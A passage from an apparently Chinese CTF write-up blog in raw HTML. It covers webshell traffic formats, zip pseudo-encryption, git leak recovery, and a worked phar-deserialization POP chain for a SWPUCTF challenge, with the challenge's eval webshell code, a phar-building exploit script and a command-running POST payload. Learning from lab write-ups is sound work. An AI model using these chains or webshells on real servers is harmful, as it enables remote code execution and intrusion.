alt=\"image-20240602175652512\"></p>\n<p>格式一般为</p>\n<p><strong>&amp;随机数&#x3D;16进制加密数据</strong>   上图：<img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240602175852852.png\" alt=\"image-20240602175852852\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240602180023008.png\" alt=\"image-20240602180023008\"></p>\n<p><strong>&amp;随机数&#x3D;xx base64加密数据    xx代表两位混淆字符</strong>   上图：<img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240602180014392.png\" alt=\"image-20240602180014392\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240602180039935.png\" alt=\"image-20240602180039935\"></p>\n<h2 id=\"zip伪加密-特征\"><a href=\"#zip伪加密-特征\" class=\"headerlink\" title=\"zip伪加密 特征\"></a>zip伪加密 特征</h2><p>Lit2023</p>\n<p>1.压缩源文件数据区 50 4B 03 04 14 00 <strong>00 09</strong></p>\n<p>2.压缩源文件目录区 50 4B 01 02 1F 00 14 <strong>00 01</strong> </p>\n<p>修改方法</p>\n<p>加粗部分的 <strong>01 00</strong> 或 <strong>09 00</strong>  改为 <strong>00 00</strong>即可</p>\n<h2 id=\"git文件泄露\"><a href=\"#git文件泄露\" class=\"headerlink\" title=\"git文件泄露\"></a>git文件泄露</h2><h3 id=\"Back-to-the-future\"><a href=\"#Back-to-the-future\" class=\"headerlink\" title=\"Back to the future\"></a>Back to the future</h3><p>使用githacker</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">githacker --url http://gz.imxbt.cn:20119/.git --output basectf</span><br></pre></td></tr></table></figure>\n\n<p>在basectf文件夹下可以<strong>看到git泄露的文件，进入到目标文件夹下</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">log</span> <span class=\"comment\">#查看git日志</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241014135916900.png\" alt=\"image-20241014135916900\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241014135947633.png\" alt=\"image-20241014135947633\"></p>\n<p>看到两条信息，可以看到<strong>第一条信息是添加什么东西</strong>，进而查看第一条信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout 9d85f10e0192ef630e10d7f876a117db41c30417</span><br></pre></td></tr></table></figure>\n\n<p>flag.txt文件恢复</p>\n<h1 id=\"序列化\"><a href=\"#序列化\" class=\"headerlink\" title=\"序列化\"></a>序列化</h1><h2 id=\"变量控制和phar反序列化\"><a href=\"#变量控制和phar反序列化\" class=\"headerlink\" title=\"变量控制和phar反序列化\"></a>变量控制和phar反序列化</h2><p>[SWPUCTF 2021 新生赛]babyunser</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//read.php</span></span><br><span class=\"line\"><span class=\"variable\">$filename</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$filename</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$file</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">zz</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"variable\">$contents</span>=<span class=\"variable\">$file</span>-&gt;<span class=\"title function_ invoke__\">getFile</span>();</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//class.php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;aa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content=<span class=\"string\">&quot;\\&lt;?php @eval(\\$_POST[1]);?&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$key</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$key</span>-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;func&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>=<span class=\"string\">&#x27;surprise&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename=<span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^\\/|php:|data|zip|\\.\\.\\//i&#x27;</span>,<span class=\"variable\">$this</span>-&gt;filename))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这不合理&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span>=<span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">        <span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"variable\">$var</span>;</span><br><span class=\"line\">        <span class=\"comment\">//此功能废弃，不想写了</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFile</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">filter</span>();</span><br><span class=\"line\">        <span class=\"variable\">$contents</span>=<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;filename);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$contents</span>))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$contents</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;404 not found&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;method&#x27;</span>]&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;var&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;eval&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;arg=<span class=\"string\">&#x27;phpinfo();&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$arg</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过读取文件可知是<strong>phar反序列化</strong></p>\n<p>看class.php来构造pop</p>\n<h3 id=\"联系xx和ff\"><a href=\"#联系xx和ff\" class=\"headerlink\" title=\"联系xx和ff\"></a>联系xx和ff</h3><p>触发点：<strong>xx中的__call</strong>  是链子终点</p>\n<p>利用点：<strong>ff中的__get</strong> 将func赋值为<code>system</code></p>\n<p>这里我把这两段代码单独取出来观察</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//xx     </span></span><br><span class=\"line\">      <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$key</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$key</span>-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;func&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//ff</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$arg</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>想办法将两点连接到一起</p>\n<p>可以看到<strong>call中</strong>会接受<strong>两个参数</strong></p>\n<p><code>__call($name,$arg)</code></p>\n<p>而__get中的</p>\n<p><code> $this-&gt;$key-&gt;&#123;$this-&gt;func&#125;($_POST[&#39;cmd&#39;]);</code></p>\n<p>如果将<strong>key指向ff</strong></p>\n<p>$name &#x3D;&#x3D;&gt; {$this-&gt;func}</p>\n<p>$arg &#x3D;&#x3D;&gt; ($_POST[‘cmd’])</p>\n<h3 id=\"控制xx类中-key\"><a href=\"#控制xx类中-key\" class=\"headerlink\" title=\"控制xx类中$key\"></a>控制xx类中$key</h3><p>但是<strong>xx类中$key</strong>也是要通过<strong>接受另一个可控的变量值</strong>来控制</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>=<span class=\"string\">&#x27;surprise&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span>=<span class=\"variable language_\">$this</span>-&gt;filename;</span><br><span class=\"line\">        <span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"variable\">$var</span>;</span><br><span class=\"line\">       </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;method&#x27;</span>]&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;var&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上边代码中的<code>$lt=$this-&gt;filename-&gt;$var;</code>可以触发get</p>\n<h4 id=\"write-var\"><a href=\"#write-var\" class=\"headerlink\" title=\"write($var)\"></a>write($var)</h4><p>这又牵扯到了<strong>write($var)<strong>中的</strong>$var</strong>,但是这不难</p>\n<p><code>$this-&gt;&#123;$_POST[&#39;method&#39;]&#125;($_POST[&#39;var&#39;]);</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload: POST</span><br><span class=\"line\"></span><br><span class=\"line\">method=write&amp;var=content</span><br></pre></td></tr></table></figure>\n\n<p>这里要讲一下var为什么赋值成<strong>content</strong></p>\n<p>此时</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//一步一步向前推，就知道为什么POST为什么这样赋值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;method&#x27;</span>]&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;var&#x27;</span>]); <span class=\"comment\">//等价于</span></span><br><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">write</span>(content)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;filename-&gt;<span class=\"variable\">$var</span>; <span class=\"comment\">//等价于</span></span><br><span class=\"line\"><span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;filename-&gt;content; <span class=\"comment\">//将filename指向__get存在的xx类 即</span></span><br><span class=\"line\"><span class=\"variable\">$lt</span>=<span class=\"variable language_\">$this</span>-&gt;xx-&gt;content; <span class=\"comment\">//而xx中的content是私有属性，触发了get</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//同时</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">__get</span>(<span class=\"variable\">$key</span>) <span class=\"comment\">//$key接受content 即</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">__get</span>(content) <span class=\"comment\">//$key变为可控的值</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"再次联系xx和ff\"><a href=\"#再次联系xx和ff\" class=\"headerlink\" title=\"再次联系xx和ff\"></a>再次联系xx和ff</h4><p>再回到前边,<strong>联系xx和ff</strong>，需要将**$key指向ff类**</p>\n<p>即<code>content = new ff;</code></p>\n<p>但是xx中的content是私有属性</p>\n<p>所以在构造pop是添加一个自定义函数即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>=<span class=\"string\">&#x27;system&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setWord</span>(<span class=\"params\"><span class=\"variable\">$content</span></span>)  //1 <span class=\"title\">xx</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p>最后触发__tostring省略，直接上exp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>; <span class=\"comment\">//3 zz</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//class.php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>=<span class=\"string\">&#x27;system&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setWord</span>(<span class=\"params\"><span class=\"variable\">$content</span></span>)  //1 <span class=\"title\">xx</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>; <span class=\"comment\">//2 ff</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"keyword\">new</span> xx;</span><br><span class=\"line\"><span class=\"variable\">$z</span>=<span class=\"keyword\">new</span> zz;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> aa;</span><br><span class=\"line\"><span class=\"variable\">$f</span>=<span class=\"keyword\">new</span> ff;</span><br><span class=\"line\"><span class=\"variable\">$f</span> -&gt; <span class=\"title function_ invoke__\">setWord</span>(<span class=\"variable\">$x</span>);</span><br><span class=\"line\"><span class=\"variable\">$z</span> -&gt; filename = <span class=\"variable\">$f</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span> -&gt; name = <span class=\"variable\">$z</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&#x27;test.phar&#x27;</span>);   <span class=\"comment\">//删除之前的test.par文件(如果有)</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&#x27;test.phar&#x27;</span>);  <span class=\"comment\">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();  <span class=\"comment\">//开始写文件</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class=\"comment\">//写入stub</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>);<span class=\"comment\">//写入meta-data</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;test&quot;</span>);  <span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">文件名</span><br><span class=\"line\">upload/93ace0ade8d79bd56459f5b2500fd8ee.txt</span><br><span class=\"line\"></span><br><span class=\"line\">POST:</span><br><span class=\"line\">file=phar://upload/3f4c778782db77d56e8257df926d5685.txt&amp;method=write&amp;var=content&amp;cmd=ls /</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"文件包含和序列化综合\"><a href=\"#文件包含和序列化综合\" class=\"headerlink\" 